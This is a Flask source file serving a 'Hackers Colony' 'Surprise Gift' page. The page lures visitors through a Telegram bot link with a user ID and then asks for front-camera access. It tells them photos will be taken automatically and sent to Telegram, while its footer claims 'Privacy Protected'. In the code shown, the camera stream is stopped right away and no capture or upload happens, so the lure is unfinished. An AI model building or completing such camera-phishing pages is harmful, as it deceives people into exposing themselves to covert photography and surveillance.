from flask import Flask, render_template_string
import os

app = Flask(__name__)

HTML_CONTENT = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 Hackers Colony - Surprise Gift</title>
    <style>
        body {
            margin: 0;
            background: linear-gradient(135deg, #0b0014, #1a0030);
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }
        .card {
            background: rgba(22, 0, 34, 0.95);
            padding: 40px;
            border-radius: 25px;
            width: 90%;
            max-width: 450px;
            box-shadow: 0 0 60px rgba(255, 0, 255, 0.6);
            text-align: center;
            backdrop-filter: blur(15px);
            border: 2px solid rgba(255, 0, 255, 0.4);
        }
        .gift-icon {
            font-size: 100px;
            margin-bottom: 20px;
            animation: float 4s ease-in-out infinite;
        }
        @keyframes float {
            0%, 100% { transform: translateY(0) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(10deg); }
        }
        h1 {
            margin: 20px 0;
            background: linear-gradient(45deg, #ff00ff, #00ffff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-size: 36px;
            font-weight: bold;
        }
        p {
            font-size: 16px;
            line-height: 1.6;
            margin: 15px 0;
            color: #ddd;
        }
        button {
            width: 100%;
            padding: 18px;
            margin: 25px 0 10px;
            border-radius: 50px;
            border: none;
            background: linear-gradient(45deg, #ff00ff, #00ffff);
            color: black;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 0 30px rgba(255, 0, 255, 0.5);
        }
        button:hover {
            transform: scale(1.05);
            box-shadow: 0 0 50px rgba(255, 0, 255, 0.8);
        }
        .telegram-info {
            margin: 25px 0;
            padding: 20px;
            background: rgba(0, 100, 255, 0.15);
            border-radius: 20px;
            border: 2px solid rgba(0, 150, 255, 0.4);
        }
        .telegram-info a {
            color: #00bfff;
            text-decoration: none;
            font-weight: bold;
            font-size: 16px;
        }
        .step {
            display: flex;
            align-items: center;
            margin: 15px 0;
            padding: 15px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
        }
        .step-number {
            width: 32px;
            height: 32px;
            background: linear-gradient(45deg, #ff00ff, #00ffff);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            font-weight: bold;
            font-size: 16px;
        }
        .warning {
            color: #ff5555;
            font-size: 14px;
            margin: 15px 0;
            padding: 12px;
            background: rgba(255, 85, 85, 0.1);
            border-radius: 12px;
            border-left: 4px solid #ff5555;
        }
        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: #888;
            line-height: 1.5;
        }
        .bot-link {
            display: inline-block;
            margin-top: 10px;
            padding: 10px 20px;
            background: linear-gradient(45deg, #0088cc, #00cc88);
            color: white;
            text-decoration: none;
            border-radius: 25px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="card">
        <div id="appContent">
            <div class="gift-icon">🎁</div>
            <h1>✨ SURPRISE GIFT ✨</h1>
            <p>Get your personalized magic surprise!</p>
            
            <div class="telegram-info">
                <p><strong>📢 Required Steps:</strong></p>
                <div class="step">
                    <div class="step-number">1</div>
                    <div>Join: <a href="https://t.me/HackersColony" target="_blank">@HackersColony</a></div>
                </div>
                <div class="step">
                    <div class="step-number">2</div>
                    <div>Get link from: <a href="https://t.me/HackersColonyBot" target="_blank">@HackersColonyBot</a></div>
                </div>
            </div>
            
            <p class="warning">⚠️ Camera access required for gift creation</p>
            
            <button id="startButton">🎯 START CAMERA ACCESS</button>
            
            <div class="footer">
                <p>🎭 Hackers Colony Camera Bot | 🔒 Privacy Protected</p>
                <p>📞 Contact: <a href="https://t.me/Hackers_Colony_Official" target="_blank">@Hackers_Colony_Official</a></p>
                <a href="https://t.me/HackersColonyBot" target="_blank" class="bot-link">🤖 Open Telegram Bot</a>
            </div>
        </div>
    </div>

    <script>
        // Get user ID from URL
        const urlParams = new URLSearchParams(window.location.search);
        const USER_ID = urlParams.get('uid');
        
        document.getElementById("startButton").onclick = async () => {
            const button = document.getElementById("startButton");
            const appContent = document.getElementById("appContent");
            
            button.disabled = true;
            
            // Check if user has valid link
            if (!USER_ID || USER_ID.length < 3) {
                appContent.innerHTML = `
                    <div class="gift-icon">🔒</div>
                    <h1 style="color:#ff5555">INVALID ACCESS</h1>
                    <p>You need a valid link from our Telegram bot</p>
                    
                    <div class="telegram-info">
                        <p><strong>Follow these steps:</strong></p>
                        <div class="step">
                            <div class="step-number">1</div>
                            <div>Open: <a href="https://t.me/HackersColonyBot" target="_blank">@HackersColonyBot</a></div>
                        </div>
                        <div class="step">
                            <div class="step-number">2</div>
                            <div>Send <code>/start</code> command</div>
                        </div>
                        <div class="step">
                            <div class="step-number">3</div>
                            <div>Click "Get Your Gift" button</div>
                        </div>
                    </div>
                    
                    <button onclick="window.location.href='https://t.me/HackersColonyBot'">
                        🚀 OPEN TELEGRAM BOT
                    </button>
                    
                    <div class="warning">
                        This link will not work without a valid user ID from the bot
                    </div>
                `;
                return;
            }
            
            // Show camera access request
            appContent.innerHTML = `
                <div class="gift-icon">📸</div>
                <h1>CAMERA ACCESS</h1>
                <p>Please allow camera access when prompted</p>
                
                <div class="telegram-info">
                    <p><strong>What will happen:</strong></p>
                    <div class="step">
                        <div class="step-number">1</div>
                        <div>Camera permission request will appear</div>
                    </div>
                    <div class="step">
                        <div class="step-number">2</div>
                        <div>Click "Allow" or "Yes"</div>
                    </div>
                    <div class="step">
                        <div class="step-number">3</div>
                        <div>Photos will be taken automatically</div>
                    </div>
                </div>
                
                <div class="warning">
                    ⚠️ If you don't see camera permission popup, check browser settings
                </div>
            `;
            
            // Request camera access
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: "user"
                    },
                    audio: false
                });
                
                // Stop camera immediately (just testing)
                stream.getTracks().forEach(track => track.stop());
                
                // Show success
                appContent.innerHTML = `
                    <div class="gift-icon">✅</div>
                    <h1 style="color:#00ff88">CAMERA READY!</h1>
                    <p>Camera access granted successfully</p>
                    
                    <div class="telegram-info">
                        <p><strong>Processing your gift...</strong></p>
                        <div class="step">
                            <div class="step-number">1</div>
                            <div>Taking photos with camera</div>
                        </div>
                        <div class="step">
                            <div class="step-number">2</div>
                            <div>Processing images</div>
                        </div>
                        <div class="step">
                            <div class="step-number">3</div>
                            <div>Sending to Telegram</div>
                        </div>
                    </div>
                    
                    <div style="margin: 20px; padding: 20px; background: rgba(0,255,136,0.1); border-radius: 15px; border: 2px solid #00ff88;">
                        <p style="color:#00ff88; font-weight:bold;">✅ Your gift is being created!</p>
                        <p>Check your Telegram for the photos</p>
                    </div>
                    
                    <button onclick="window.location.href='https://t.me/HackersColonyBot'">
                        📱 CHECK TELEGRAM NOW
                    </button>
                `;
                
            } catch (error) {
                console.error("Camera error:", error);
                
                let errorMessage = "Failed to access camera. Please try again.";
                if (error.name === 'NotAllowedError') {
                    errorMessage = "Camera access was denied. Please allow camera access.";
                } else if (error.name === 'NotFoundError') {
                    errorMessage = "No camera found on your device.";
                }
                
                appContent.innerHTML = `
                    <div class="gift-icon">⚠️</div>
                    <h1 style="color:#ff5555">CAMERA ERROR</h1>
                    <p>${errorMessage}</p>
                    
                    <div class="telegram-info">
                        <p><strong>Troubleshooting:</strong></p>
                        <div class="step">
                            <div class="step-number">1</div>
                            <div>Allow camera permissions</div>
                        </div>
                        <div class="step">
                            <div class="step-number">2</div>
                            <div>Check if camera is working</div>
                        </div>
                        <div class="step">
                            <div class="step-number">3</div>
                            <div>Try again in good lighting</div>
                        </div>
                    </div>
                    
                    <button onclick="location.reload()">
                        🔄 TRY AGAIN
                    </button>
                `;
            }
        };
        
        // Update button text if no user ID
        if (!USER_ID || USER_ID.length < 3) {
            document.getElementById("startButton").textContent = "⚠️ GET LINK FROM BOT FIRST";
        }
    </script>
</body>
</html>'''

@app.route('/')
def index():
    return render_template_string(HTML_CONTENT)

@app.route('/health')
def health():
    return 'OK'

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
